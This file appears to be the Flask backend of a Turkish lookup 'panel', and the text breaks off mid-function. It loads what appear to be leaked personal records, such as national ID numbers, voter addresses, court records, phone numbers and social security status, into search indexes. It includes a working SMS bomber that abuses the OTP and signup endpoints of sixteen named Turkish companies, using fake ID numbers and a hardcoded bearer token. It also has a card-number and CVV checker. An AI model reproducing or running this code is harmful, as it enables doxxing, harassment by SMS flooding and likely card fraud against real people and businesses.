from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import os
import re
import json
import requests
import time
import threading
from random import choice, randint
from string import ascii_lowercase
from datetime import datetime
import io

app = Flask(__name__)
CORS(app)

# ==================== VERİ DEPOLAMA ====================
eokul_veriler = []
eokul_dict = {}

secmen_veriler = []
secmen_dict = {}

plaka_veriler = []
plaka_plaka_dict = {}
plaka_isim_dict = {}

sicil_veriler = []
sicil_tc_dict = {}
sicil_ad_soyad_dict = {}

turknet_veriler = []
turknet_ad_dict = {}
turknet_phone_dict = {}

papara_veriler = []
papara_id_dict = {}
papara_isim_dict = {}

sgk_veriler = []
sgk_tc_dict = {}
sgk_ad_soyad_dict = {}

universite_veriler = []
universite_tc_dict = {}          # TC'ye göre
universite_ad_soyad_dict = {}    # Ad-Soyad'a göre
universite_okul_dict = {}        # Okula göre

# SMS Bomber için
sms_threads = {}
sms_results = {}

# Telegram Bot Token (OPSİYONEL)
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')

STRIPE_SECRET_KEY = os.environ.get('STRIPE_SECRET_KEY', '')

# ==================== VERİ YÜKLEME FONKSİYONLARI ====================

def eokul_verileri_yukle():
    global eokul_veriler, eokul_dict
    eokul_veriler = []
    eokul_dict = {}
    
    dosya_yolu = 'eokul.txt'
    if not os.path.exists(dosya_yolu):
        print(f"⚠️ Uyarı: {dosya_yolu} dosyası bulunamadı!")
        return
    
    try:
        with open(dosya_yolu, 'r', encoding='utf-8') as dosya:
            for satir in dosya:
                satir = satir.strip()
                if not satir:
                    continue
                
                parcalar = [p.strip() for p in satir.split('|')]
                
                if len(parcalar) >= 5:
                    kisi = {
                        'tc': parcalar[0],
                        'ad': parcalar[1],
                        'soyad': parcalar[2],
                        'dogum': parcalar[3],
                        'universite': parcalar[4]
                    }
                    eokul_veriler.append(kisi)
                    eokul_dict[parcalar[0]] = kisi
        
        print(f"✅ E-Okul: {len(eokul_veriler)} kayıt yüklendi.")
    except Exception as e:
        print(f"❌ E-Okul hatası: {e}")

def secmen_verileri_yukle():
    global secmen_veriler, secmen_dict
    secmen_veriler = []
    secmen_dict = {}
    
    dosya_yolu = 'secmen.txt'
    if not os.path.exists(dosya_yolu):
        print(f"⚠️ Uyarı: {dosya_yolu} dosyası bulunamadı!")
        return
    
    try:
        with open(dosya_yolu, 'r', encoding='utf-8') as dosya:
            for satir in dosya:
                satir = satir.strip()
                if not satir:
                    continue
                
                parcalar = [p.strip() for p in satir.split('|')]
                
                if len(parcalar) >= 5:
                    kisi = {
                        'tc': parcalar[0],
                        'ad': parcalar[1],
                        'soyad': parcalar[2],
                        'il': parcalar[3],
                        'adres': parcalar[4]
                    }
                    secmen_veriler.append(kisi)
                    secmen_dict[parcalar[0]] = kisi
        
        print(f"✅ Seçmen: {len(secmen_veriler)} kayıt yüklendi.")
    except Exception as e:
        print(f"❌ Seçmen hatası: {e}")

def plaka_verileri_yukle():
    global plaka_veriler, plaka_plaka_dict, plaka_isim_dict
    plaka_veriler = []
    plaka_plaka_dict = {}
    plaka_isim_dict = {}
    
    dosya_yolu = 'plaka.txt'
    if not os.path.exists(dosya_yolu):
        print(f"⚠️ Uyarı: {dosya_yolu} dosyası bulunamadı!")
        return
    
    try:
        with open(dosya_yolu, 'r', encoding='utf-8') as dosya:
            for satir in dosya:
                satir = satir.strip()
                if not satir:
                    continue
                
                parcalar = satir.split()
                if len(parcalar) >= 2:
                    plaka = parcalar[-1]
                    ad_soyad = ' '.join(parcalar[:-1])
                    ad_soyad = ' '.join(ad_soyad.split())
                    
                    kisi = {
                        'ad_soyad': ad_soyad,
                        'plaka': plaka
                    }
                    
                    plaka_veriler.append(kisi)
                    
                    if plaka not in plaka_plaka_dict:
                        plaka_plaka_dict[plaka] = []
                    plaka_plaka_dict[plaka].append(ad_soyad)
                    
                    if ad_soyad not in plaka_isim_dict:
                        plaka_isim_dict[ad_soyad] = []
                    plaka_isim_dict[ad_soyad].append(plaka)
        
        print(f"✅ Plaka: {len(plaka_veriler)} kayıt yüklendi.")
        print(f"   - {len(plaka_plaka_dict)} benzersiz plaka")
        print(f"   - {len(plaka_isim_dict)} benzersiz kişi")
    except Exception as e:
        print(f"❌ Plaka hatası: {e}")

def sicil_verileri_yukle():
    global sicil_veriler, sicil_tc_dict, sicil_ad_soyad_dict
    sicil_veriler = []
    sicil_tc_dict = {}
    sicil_ad_soyad_dict = {}
    
    dosya_yolu = 'sicil.txt'
    if not os.path.exists(dosya_yolu):
        print(f"⚠️ Uyarı: {dosya_yolu} dosyası bulunamadı!")
        return
    
    try:
        with open(dosya_yolu, 'r', encoding='utf-8') as dosya:
            icerik = dosya.read()
            
            try:
                veri = json.loads(icerik)
                
                if isinstance(veri, list):
                    for item in veri:
                        if isinstance(item, dict):
                            if 'Veri' in item and item['Veri']:
                                for kayit in item['Veri']:
                                    _sicil_kayit_ekle(kayit)
                            elif 'KISI_ADI' in item or 'AVUKAT_TC_KIMLIK_NO' in item:
                                _sicil_kayit_ekle(item)
                elif isinstance(veri, dict):
                    if 'Veri' in veri and veri['Veri']:
                        for kayit in veri['Veri']:
                            _sicil_kayit_ekle(kayit)
                            
            except json.JSONDecodeError:
                print("⚠️ Sicil dosyası JSON formatında değil, düz metin olarak okunuyor...")
                for satir in icerik.split('\n'):
                    satir = satir.strip()
                    if not satir:
                        continue
                    
                    parcalar = [p.strip() for p in satir.split('|')]
                    if len(parcalar) >= 3:
                        kisi = {
                            'tc': parcalar[0] if len(parcalar) > 0 else '',
                            'ad': parcalar[1] if len(parcalar) > 1 else '',
                            'soyad': parcalar[2] if len(parcalar) > 2 else '',
                            'dosya_no': parcalar[3] if len(parcalar) > 3 else '',
                            'kurum': parcalar[4] if len(parcalar) > 4 else ''
                        }
                        sicil_veriler.append(kisi)
                        if kisi['tc']:
                            sicil_tc_dict[kisi['tc']] = kisi
        
        print(f"✅ Sicil: {len(sicil_veriler)} kayıt yüklendi.")
        print(f"   - {len(sicil_tc_dict)} benzersiz TC")
        print(f"   - {len(sicil_ad_soyad_dict)} benzersiz Ad-Soyad")
    except Exception as e:
        print(f"❌ Sicil hatası: {e}")

def _sicil_kayit_ekle(kayit):
    global sicil_veriler, sicil_tc_dict, sicil_ad_soyad_dict
    
    try:
        kisi = {
            'tc': kayit.get('AVUKAT_TC_KIMLIK_NO', '').strip() or kayit.get('TC', '').strip() or '',
            'ad': kayit.get('KISI_ADI', '').strip() or kayit.get('AD', '').strip() or '',
            'soyad': kayit.get('KISI_SOYAD', '').strip() or kayit.get('SOYAD', '').strip() or '',
            'dosya_no': kayit.get('DOSYA_NO', '').strip() or '',
            'suc': kayit.get('KISI_SUC_ADI', '').strip() or '',
            'kisi_tip': kayit.get('KISI_TIP_ADI', '').strip() or '',
            'kurum': kayit.get('KURUM_ADI', '').strip() or '',
            'avukat': f"{kayit.get('AVUKAT_ADI', '')} {kayit.get('AVUKAT_SOYADI', '')}".strip() or '',
            'avukat_tc': kayit.get('AVUKAT_TC_KIMLIK_NO', '').strip() or '',
            'avukat_sicil': kayit.get('AVUKAT_SICIL_NO', '').strip() or '',
            'durum': kayit.get('DOSYA_DURUM_ADI', '').strip() or '',
            'odeme': kayit.get('ODEME_DURUM_ADI', '').strip() or ''
        }
        
        if kisi['tc'] or kisi['ad']:
            sicil_veriler.append(kisi)
            if kisi['tc']:
                sicil_tc_dict[kisi['tc']] = kisi
            
            ad_soyad = f"{kisi['ad']} {kisi['soyad']}".strip()
            if ad_soyad:
                if ad_soyad not in sicil_ad_soyad_dict:
                    sicil_ad_soyad_dict[ad_soyad] = []
                sicil_ad_soyad_dict[ad_soyad].append(kisi)
    except Exception as e:
        print(f"⚠️ Sicil kaydı eklenirken hata: {e}")

def turknet_verileri_yukle():
    global turknet_veriler, turknet_ad_dict, turknet_phone_dict
    turknet_veriler = []
    turknet_ad_dict = {}
    turknet_phone_dict = {}
    
    dosya_yolu = 'turknet.txt'
    if not os.path.exists(dosya_yolu):
        print(f"⚠️ Uyarı: {dosya_yolu} dosyası bulunamadı!")
        return
    
    try:
        with open(dosya_yolu, 'r', encoding='utf-8') as dosya:
            icerik = dosya.read()
            
            try:
                veri = json.loads(icerik)
                
                if isinstance(veri, list):
                    for kayit in veri:
                        if isinstance(kayit, dict):
                            _turknet_kayit_ekle(kayit)
                elif isinstance(veri, dict):
                    _turknet_kayit_ekle(veri)
                    
            except json.JSONDecodeError:
                print("⚠️ TurkNet dosyası JSON formatında değil, düz metin olarak okunuyor...")
                for satir in icerik.split('\n'):
                    satir = satir.strip()
                    if not satir:
                        continue
                    
                    parcalar = [p.strip() for p in satir.split('|')]
                    if len(parcalar) >= 2:
                        kisi = {
                            'ad': parcalar[0] if len(parcalar) > 0 else '',
                            'telefon': parcalar[1] if len(parcalar) > 1 else '',
                            'il': parcalar[2] if len(parcalar) > 2 else '',
                            'ilce': parcalar[3] if len(parcalar) > 3 else '',
                            'adres': parcalar[4] if len(parcalar) > 4 else ''
                        }
                        _turknet_kayit_ekle(kisi)
        
        print(f"✅ TurkNet: {len(turknet_veriler)} kayıt yüklendi.")
        print(f"   - {len(turknet_ad_dict)} benzersiz ad")
        print(f"   - {len(turknet_phone_dict)} benzersiz telefon")
    except Exception as e:
        print(f"❌ TurkNet hatası: {e}")

def _turknet_kayit_ekle(kayit):
    global turknet_veriler, turknet_ad_dict, turknet_phone_dict
    
    try:
        ad = kayit.get('name', kayit.get('ad', kayit.get('AD', ''))).strip()
        telefon = kayit.get('phone', kayit.get('telefon', kayit.get('TELEFON', ''))).strip()
        il = kayit.get('city', kayit.get('il', kayit.get('IL', ''))).strip()
        ilce = kayit.get('district', kayit.get('ilce', kayit.get('ILCE', ''))).strip()
        adres = kayit.get('address', kayit.get('adres', kayit.get('ADRES', ''))).strip()
        
        kisi = {
            'ad': ad,
            'telefon': telefon,
            'il': il,
            'ilce': ilce,
            'adres': adres
        }
        
        if kisi['ad'] or kisi['telefon']:
            turknet_veriler.append(kisi)
            
            if kisi['ad']:
                if kisi['ad'] not in turknet_ad_dict:
                    turknet_ad_dict[kisi['ad']] = []
                turknet_ad_dict[kisi['ad']].append(kisi)
            
            if kisi['telefon']:
                turknet_phone_dict[kisi['telefon']] = kisi
    except Exception as e:
        print(f"⚠️ TurkNet kaydı eklenirken hata: {e}")

def papara_verileri_yukle():
    global papara_veriler, papara_id_dict, papara_isim_dict
    papara_veriler = []
    papara_id_dict = {}
    papara_isim_dict = {}
    
    dosya_yolu = 'papara.txt'
    if not os.path.exists(dosya_yolu):
        print(f"⚠️ Uyarı: {dosya_yolu} dosyası bulunamadı!")
        return
    
    try:
        with open(dosya_yolu, 'r', encoding='utf-8') as dosya:
            for satir in dosya:
                satir = satir.strip()
                if not satir:
                    continue
                
                parcalar = [p.strip() for p in satir.split(',')]
                
                if len(parcalar) >= 2:
                    papara_id = parcalar[0]
                    ad_soyad = parcalar[1]
                    
                    kisi = {
                        'papara_id': papara_id,
                        'ad_soyad': ad_soyad
                    }
                    
                    papara_veriler.append(kisi)
                    papara_id_dict[papara_id] = ad_soyad
                    
                    if ad_soyad not in papara_isim_dict:
                        papara_isim_dict[ad_soyad] = []
                    papara_isim_dict[ad_soyad].append(papara_id)
        
        print(f"✅ Papara: {len(papara_veriler)} kayıt yüklendi.")
        print(f"   - {len(papara_id_dict)} benzersiz ID")
        print(f"   - {len(papara_isim_dict)} benzersiz kişi")
    except Exception as e:
        print(f"❌ Papara hatası: {e}")

def sgk_verileri_yukle():
    global sgk_veriler, sgk_tc_dict, sgk_ad_soyad_dict
    sgk_veriler = []
    sgk_tc_dict = {}
    sgk_ad_soyad_dict = {}
    
    dosya_yolu = 'sgk.txt'
    if not os.path.exists(dosya_yolu):
        print(f"⚠️ Uyarı: {dosya_yolu} dosyası bulunamadı!")
        return
    
    try:
        with open(dosya_yolu, 'r', encoding='utf-8') as dosya:
            for satir in dosya:
                satir = satir.strip()
                if not satir:
                    continue
                
                parcalar = [p.strip() for p in satir.split(',')]
                
                if len(parcalar) < 3:
                    parcalar = [p.strip() for p in satir.split('|')]
                if len(parcalar) < 3:
                    parcalar = [p.strip() for p in satir.split('\t')]
                if len(parcalar) < 3:
                    parcalar = [p.strip() for p in satir.split()]
                
                if len(parcalar) >= 3:
                    tc = parcalar[0]
                    ad = parcalar[1]
                    soyad = parcalar[2]
                    durum = parcalar[3] if len(parcalar) > 3 else ""
                    
                    kisi = {
                        'tc': tc,
                        'ad': ad,
                        'soyad': soyad,
                        'durum': durum
                    }
                    
                    sgk_veriler.append(kisi)
                    sgk_tc_dict[tc] = kisi
                    
                    ad_soyad = f"{ad} {soyad}".strip().upper()
                    if ad_soyad not in sgk_ad_soyad_dict:
                        sgk_ad_soyad_dict[ad_soyad] = []
                    sgk_ad_soyad_dict[ad_soyad].append(kisi)
        
        print(f"✅ SGK: {len(sgk_veriler)} kayıt yüklendi.")
        print(f"   - {len(sgk_tc_dict)} benzersiz TC")
        print(f"   - {len(sgk_ad_soyad_dict)} benzersiz Ad-Soyad")
    except Exception as e:
        print(f"❌ SGK hatası: {e}")

def universite_verileri_yukle():
    """universite.txt dosyasındaki verileri yükler - HER FORMATI DESTEKLER"""
    global universite_veriler, universite_tc_dict, universite_ad_soyad_dict, universite_okul_dict
    universite_veriler = []
    universite_tc_dict = {}
    universite_ad_soyad_dict = {}
    universite_okul_dict = {}
    
    dosya_yolu = 'üniversite.txt'
    if not os.path.exists(dosya_yolu):
        print(f"⚠️ Uyarı: {dosya_yolu} dosyası bulunamadı!")
        return
    
    try:
        with open(dosya_yolu, 'r', encoding='utf-8') as dosya:
            icerik = dosya.read()
            
            # Blokları ayır (her blok "TC:" ile başlar)
            bloklar = re.split(r'\n\s*(?=TC:)', icerik)
            
            for blok in bloklar:
                if not blok.strip():
                    continue
                
                # TC'yi bul
                tc_match = re.search(r'TC:\s*([0-9]+)', blok)
                if not tc_match:
                    continue
                tc = tc_match.group(1).strip()
                
                # Ad-Soyad'ı bul
                ad_match = re.search(r'AD-SOYAD:\s*([^\n]+)', blok)
                ad_soyad = ad_match.group(1).strip() if ad_match else ""
                
                # Üniversite'yi bul
                univ_match = re.search(r'ÜNİVERSİTE:\s*([^\n]+)', blok)
                universite = univ_match.group(1).strip() if univ_match else ""
                
                # Bölüm'ü bul
                bolum_match = re.search(r'BÖLÜM:\s*([^\n]+)', blok)
                bolum = bolum_match.group(1).strip() if bolum_match else ""
                
                if tc:
                    kisi = {
                        'tc': tc,
                        'ad_soyad': ad_soyad,
                        'universite': universite,
                        'bolum': bolum
                    }
                    
                    universite_veriler.append(kisi)
                    universite_tc_dict[tc] = kisi
                    
                    if ad_soyad:
                        if ad_soyad not in universite_ad_soyad_dict:
                            universite_ad_soyad_dict[ad_soyad] = []
                        universite_ad_soyad_dict[ad_soyad].append(kisi)
                    
                    if universite:
                        universite_okul_dict[universite] = universite_okul_dict.get(universite, [])
                        universite_okul_dict[universite].append(kisi)
        
        print(f"✅ Üniversite: {len(universite_veriler)} kayıt yüklendi.")
        print(f"   - {len(universite_tc_dict)} benzersiz TC")
        print(f"   - {len(universite_ad_soyad_dict)} benzersiz Ad-Soyad")
        print(f"   - {len(universite_okul_dict)} benzersiz Üniversite")
    except Exception as e:
        print(f"❌ Üniversite hatası: {e}")

# ==================== SMS BOMBER SINIFI ====================

class SendSms:
    def __init__(self, phone):
        self.phone = str(phone)
        self.adet = 0
        self.results = []
        
        rakam = []
        tcNo = ""
        rakam.append(randint(1,9))
        for i in range(1, 9):
            rakam.append(randint(0,9))
        rakam.append(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - (rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10)
        rakam.append((rakam[0] + rakam[1] + rakam[2] + rakam[3] + rakam[4] + rakam[5] + rakam[6] + rakam[7] + rakam[8] + rakam[9]) % 10)
        for r in rakam:
            tcNo += str(r)
        self.tc = tcNo
        self.mail = ''.join(choice(ascii_lowercase) for i in range(22)) + "@gmail.com"
    
    def _send_request(self, url, method='POST', headers=None, data=None, json_data=None):
        default_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "tr-TR,tr;q=0.9,en;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Dnt": "1",
            "Sec-Gpc": "1",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "Priority": "u=0"
        }
        
        if headers:
            default_headers.update(headers)
        
        try:
            if method.upper() == 'POST':
                if json_data:
                    r = requests.post(url, headers=default_headers, json=json_data, timeout=10)
                else:
                    r = requests.post(url, headers=default_headers, data=data, timeout=10)
            else:
                r = requests.get(url, headers=default_headers, timeout=10)
            return r
        except:
            return None
    
    def KahveDunyasi(self):
        try:
            url = "https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number"
            headers = {"X-Language-Id": "tr-TR", "X-Client-Platform": "web", "Origin": "https://www.kahvedunyasi.com"}
            json_data = {"countryCode": "90", "phoneNumber": self.phone}
            r = self._send_request(url, json_data=json_data, headers=headers)
            if r and r.status_code == 200 and r.json().get("processStatus") == "Success":
                self.adet += 1
                self.results.append({"service": "KahveDunyasi", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "KahveDunyasi", "status": "failed"})
        return False
    
    def Wmf(self):
        try:
            url = "https://www.wmf.com.tr/users/register/"
            data = {
                "confirm": "true", "date_of_birth": "1956-03-01", "email": self.mail,
                "email_allowed": "true", "first_name": "Memati", "gender": "male",
                "last_name": "Bas", "password": "31ABC..abc31", "phone": f"0{self.phone}"
            }
            r = self._send_request(url, data=data)
            if r and r.status_code == 202:
                self.adet += 1
                self.results.append({"service": "Wmf", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Wmf", "status": "failed"})
        return False
    
    def Bim(self):
        try:
            url = "https://bim.veesk.net/service/v1.0/account/login"
            json_data = {"phone": self.phone}
            r = self._send_request(url, json_data=json_data)
            if r and r.status_code == 200:
                self.adet += 1
                self.results.append({"service": "Bim", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Bim", "status": "failed"})
        return False
    
    def Englishhome(self):
        try:
            url = "https://www.englishhome.com/api/member/sendOtp"
            headers = {"Referer": "https://www.englishhome.com/", "Origin": "https://www.englishhome.com"}
            json_data = {"Phone": self.phone, "XID": ""}
            r = self._send_request(url, json_data=json_data, headers=headers)
            if r and r.status_code == 200 and r.json().get("isError") == False:
                self.adet += 1
                self.results.append({"service": "Englishhome", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Englishhome", "status": "failed"})
        return False
    
    def Suiste(self):
        try:
            url = "https://suiste.com/api/auth/code"
            headers = {
                "X-Mobillium-Device-Brand": "Apple", "X-Mobillium-Os-Type": "iOS",
                "X-Mobillium-Device-Model": "iPhone", "Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330"
            }
            data = {
                "action": "register", "device_id": "2390ED28-075E-465A-96DA-DFE8F84EB330",
                "full_name": "Memati Bas", "gsm": self.phone,
                "is_advertisement": "1", "is_contract": "1", "password": "31MeMaTi31"
            }
            r = self._send_request(url, data=data, headers=headers)
            if r and r.status_code == 200 and r.json().get("code") == "common.success":
                self.adet += 1
                self.results.append({"service": "Suiste", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Suiste", "status": "failed"})
        return False
    
    def KimGb(self):
        try:
            url = "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/send-otp"
            json_data = {"msisdn": f"90{self.phone}"}
            r = self._send_request(url, json_data=json_data)
            if r and r.status_code == 200:
                self.adet += 1
                self.results.append({"service": "KimGb", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "KimGb", "status": "failed"})
        return False
    
    def Evidea(self):
        try:
            url = "https://www.evidea.com/users/register/"
            headers = {
                "X-Project-Name": "undefined", "X-App-Type": "akinon-mobile",
                "X-Requested-With": "XMLHttpRequest", "X-App-Device": "ios"
            }
            data = {
                "first_name": "Memati", "last_name": "Bas", "email": self.mail,
                "email_allowed": "false", "sms_allowed": "true",
                "password": "31ABC..abc31", "phone": f"0{self.phone}", "confirm": "true"
            }
            r = self._send_request(url, data=data, headers=headers)
            if r and r.status_code == 202:
                self.adet += 1
                self.results.append({"service": "Evidea", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Evidea", "status": "failed"})
        return False
    
    def Ucdortbes(self):
        try:
            url = "https://api.345dijital.com/api/users/register"
            json_data = {"email": "", "name": "Memati", "phoneNumber": f"+90{self.phone}", "surname": "Bas"}
            r = self._send_request(url, json_data=json_data)
            if r and r.status_code == 200 and r.json().get("error") != "E-Posta veya telefon zaten kayıtlı!":
                self.adet += 1
                self.results.append({"service": "Ucdortbes", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Ucdortbes", "status": "failed"})
        return False
    
    def TiklaGelsin(self):
        try:
            url = "https://svc.apps.tiklagelsin.com/user/graphql"
            headers = {"X-Merchant-Type": "0", "Appversion": "2.4.1", "X-No-Auth": "true", "X-Device-Type": "2"}
            json_data = {
                "operationName": "GENERATE_OTP",
                "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n",
                "variables": {
                    "challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68",
                    "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB",
                    "phone": f"+90{self.phone}"
                }
            }
            r = self._send_request(url, json_data=json_data, headers=headers)
            if r and r.status_code == 200 and r.json().get("data", {}).get("generateOtp") == True:
                self.adet += 1
                self.results.append({"service": "TiklaGelsin", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "TiklaGelsin", "status": "failed"})
        return False
    
    def Naosstars(self):
        try:
            url = "https://api.naosstars.com/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
            headers = {
                "Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351",
                "Version": "1.0030", "Os": "ios", "Platform": "ios"
            }
            json_data = {"telephone": f"+90{self.phone}", "type": "register"}
            r = self._send_request(url, json_data=json_data, headers=headers)
            if r and r.status_code == 200:
                self.adet += 1
                self.results.append({"service": "Naosstars", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Naosstars", "status": "failed"})
        return False
    
    def Koton(self):
        try:
            url = "https://www.koton.com/users/register/"
            headers = {
                "X-Project-Name": "rn-env", "X-App-Type": "akinon-mobile",
                "X-Requested-With": "XMLHttpRequest", "X-App-Device": "ios"
            }
            data = {
                "first_name": "Memati", "last_name": "Bas", "email": self.mail,
                "password": "31ABC..abc31", "phone": f"0{self.phone}",
                "confirm": "true", "sms_allowed": "true", "email_allowed": "true",
                "date_of_birth": "1993-07-02", "call_allowed": "true", "gender": ""
            }
            r = self._send_request(url, data=data, headers=headers)
            if r and r.status_code == 202:
                self.adet += 1
                self.results.append({"service": "Koton", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Koton", "status": "failed"})
        return False
    
    def Hayatsu(self):
        try:
            url = "https://api.hayatsu.com.tr/api/SignUp/SendOtp"
            headers = {
                "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJhMTA5MWQ1ZS0wYjg3LTRjYWQtOWIxZi0yNTllMDI1MjY0MmMiLCJsb2dpbmRhdGUiOiIxOS4wMS4yMDI0IDIyOjU3OjM3Iiwibm90dXNlciI6InRydWUiLCJwaG9uZU51bWJlciI6IiIsImV4cCI6MTcyMTI0NjI1NywiaXNzIjoiaHR0cHM6Ly9oYXlhdHN1LmNvbS50ciIsImF1ZCI6Imh0dHBzOi8vaGF5YXRzdS5jb20udHIifQ.Cip4hOxGPVz7R2eBPbq95k6EoICTnPLW9o2eDY6qKMM",
                "Origin": "https://www.hayatsu.com.tr"
            }
            data = {"mobilePhoneNumber": self.phone, "actionType": "register"}
            r = self._send_request(url, data=data, headers=headers)
            if r and r.status_code == 200 and r.json().get("is_success") == True:
                self.adet += 1
                self.results.append({"service": "Hayatsu", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Hayatsu", "status": "failed"})
        return False
    
    def Hizliecza(self):
        try:
            url = "https://prod.hizliecza.net/mobil/account/sendOTP"
            headers = {"Authorization": "Bearer null"}
            json_data = {"otpOperationType": 1, "phoneNumber": f"+90{self.phone}"}
            r = self._send_request(url, json_data=json_data, headers=headers)
            if r and r.status_code == 200:
                self.adet += 1
                self.results.append({"service": "Hizliecza", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Hizliecza", "status": "failed"})
        return False
    
    def Metro(self):
        try:
            url = "https://mobile.metro-tr.com/api/mobileAuth/validateSmsSend"
            headers = {"Applicationversion": "2.4.1", "Applicationplatform": "2"}
            json_data = {"methodType": "2", "mobilePhoneNumber": self.phone}
            r = self._send_request(url, json_data=json_data, headers=headers)
            if r and r.status_code == 200 and r.json().get("status") == "success":
                self.adet += 1
                self.results.append({"service": "Metro", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Metro", "status": "failed"})
        return False
    
    def File(self):
        try:
            url = "https://api.filemarket.com.tr/v1/otp/send"
            headers = {"X-Os": "IOS", "X-Version": "1.7"}
            json_data = {"mobilePhoneNumber": f"90{self.phone}"}
            r = self._send_request(url, json_data=json_data, headers=headers)
            if r and r.status_code == 200 and r.json().get("responseType") == "SUCCESS":
                self.adet += 1
                self.results.append({"service": "File", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "File", "status": "failed"})
        return False
    
    def Akasya(self):
        try:
            url = "https://akasyaapi.poilabs.com/v1/en/sms"
            headers = {"X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5"}
            json_data = {"phone": self.phone}
            r = self._send_request(url, json_data=json_data, headers=headers)
            if r and r.status_code == 200 and r.json().get("result") == "SMS sended succesfully!":
                self.adet += 1
                self.results.append({"service": "Akasya", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Akasya", "status": "failed"})
        return False
    
    def run_all(self):
        services = [
            self.KahveDunyasi, self.Wmf, self.Bim, self.Englishhome,
            self.Suiste, self.KimGb, self.Evidea, self.Ucdortbes,
            self.TiklaGelsin, self.Naosstars, self.Koton, self.Hayatsu,
            self.Hizliecza, self.Metro, self.File, self.Akasya
        ]
        
        for service in services:
            try:
                service()
                time.sleep(0.5)
            except:
                pass
        
        return {
            'total': len(services),
            'success': self.adet,
            'failed': len(services) - self.adet,
            'results': self.results
        }

# ==================== CC DOĞRULAMA FONKSİYONLARI ====================

def luhn_kontrol(kart_no):
    kart_no = re.sub(r'\D', '', kart_no)
    if not kart_no.isdigit():
        return False
    toplam = 0
    cift = False
    for rakam in reversed(kart_no):
        rakam = int(rakam)
        if cift:
            rakam *= 2
            if rakam > 9:
                rakam -= 9
        toplam += rakam
        cift = not cift
    return toplam % 10 == 0

def kart_bilgilerini_kontrol(kart_no, ay, yil, cvv):
    hatalar = []
    kart_no = re.sub(r'\D', '', kart_no)
    if len(kart_no) < 13 or len(kart_no) > 19:
        hatalar.append("Kart numarası 13-19 hane arası olmalıdır")
    elif not luhn_kontrol(kart_no):
        hatalar.append("Kart numarası geçersiz (Luhn kontrolü başarısız)")
    try:
        ay_int = int(ay)
        if ay_int < 1 or ay_int > 12:
            hatalar.append("Ay 1-12 arası olmalıdır")
    except ValueError:
        hatalar.append("Geçerli bir ay giriniz")
    try:
        yil_int = int(yil)
        if yil_int < 2024 or yil_int > 2035:
            hatalar.append("Yıl 2024-2035 arası olmalıdır")
    except ValueError:
        hatalar.append("Geçerli bir yıl giriniz")
    if len(str(cvv)) < 3 or len(str(cvv)) > 4:
        hatalar.append("CVV 3-4 hane olmalıdır")
    elif not str(cvv).isdigit():
        hatalar.append("CVV sadece rakam içermelidir")
    return hatalar

# ==================== TELEGRAM FONKSİYONLARI ====================

def telegram_user_info_public(username):
    try:
        if username.startswith('@'):
            username = username[1:]
        
        url = f"https://t.me/{username}"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "tr-TR,tr;q=0.9,en;q=0.8"
        }
        
        response = requests.get(url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            content = response.text
            import re
            
            title_match = re.search(r'<title>(.*?)</title>', content)
            title = title_match.group(1) if title_match else ""
            
            desc_match = re.search(r'<meta property="og:description" content="(.*?)"', content)
            description = desc_match.group(1) if desc_match else ""
            
            image_match = re.search(r'<meta property="og:image" content="(.*?)"', content)
            profile_image = image_match.group(1) if image_match else ""
            
            member_match = re.search(r'(\d+[\.,]?\d*)\s*(?:members?|subscribers?)', content, re.IGNORECASE)
            member_count = member_match.group(1) if member_match else "0"
            
            return {
                'success': True,
                'username': username,
                'title': title,
                'display_name': title,
                'description': description,
                'profile_image': profile_image,
                'member_count': member_count,
                'type': 'Kullanıcı' if not member_count or member_count == "0" else 'Kanal/Grup',
                'url': url
            }
        else:
            return {
                'success': False,
                'message': f'@{username} kullanıcısı bulunamadı',
                'username': username
            }
    except Exception as e:
        return {'success': False, 'message': f'Hata: {str(e)}'}

def telegram_post_analyze(post_link):
    try:
        pattern = r't\.me/(?:c/)?([^/]+)/(\d+)'
        match = re.search(pattern, post_link)
        
        if not match:
            return {
                'success': False,
